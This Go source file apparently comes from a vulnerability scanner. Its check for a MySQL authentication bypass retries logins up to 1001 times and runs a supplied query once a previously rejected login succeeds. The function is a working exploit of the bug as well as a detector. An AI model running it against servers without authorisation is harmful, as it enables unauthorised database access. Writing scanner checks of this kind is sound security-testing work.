package js

import (
	"context"
	"errors"
	"fmt"
	mysql "github.com/go-sql-driver/mysql"
	"time"
)

// CheckAuthenticationBypass replaces an unbounded JavaScript catch/retry loop.
// Only authentication rejection (1045) permits another attempt. Network and
// protocol errors stop immediately; timeout is an incomplete check, not a pass.
func (c *MySQLClient) CheckAuthenticationBypass(host string, port int, user, pass, query string) (map[string]any, error) {
	budget := c.timeout * 4 / 5
	if deadline, ok := c.ctx.Deadline(); ok {
		budget = time.Until(deadline) * 4 / 5
	}
	if budget <= 0 {
		return nil, context.DeadlineExceeded
	}
	ctx, cancel := context.WithTimeout(c.ctx, budget)
	defer cancel()
	dialBudget := c.timeout
	if budget < dialBudget {
		dialBudget = budget
	}
	client := NewMySQLClient(ctx, dialBudget)
	rejected := false
	for i := 0; i < 1001; i++ {
		if ctx.Err() != nil {
			return nil, fmt.Errorf("MySQL auth-bypass: проверка не завершена за %s (%d попыток): %w", budget.Round(time.Millisecond), i, ctx.Err())
		}
		result, err := client.ExecuteQuery(host, port, user, pass, query)
		if err == nil {
			return map[string]any{"Vulnerable": rejected, "Result": result, "Attempts": i + 1}, nil
		}
		var authErr *mysql.MySQLError
		if errors.As(err, &authErr) && authErr.Number == 1045 {
			rejected = true
			continue
		}
		deadline, _ := ctx.Deadline()
		if ctx.Err() != nil || !time.Now().Before(deadline) {
			cause := ctx.Err()
			if cause == nil {
				cause = context.DeadlineExceeded
			}
			return nil, fmt.Errorf("MySQL auth-bypass: проверка не завершена (%d попыток): %w", i+1, cause)
		}
		return nil, err
	}
	return map[string]any{"Vulnerable": false, "Attempts": 1001}, nil
}
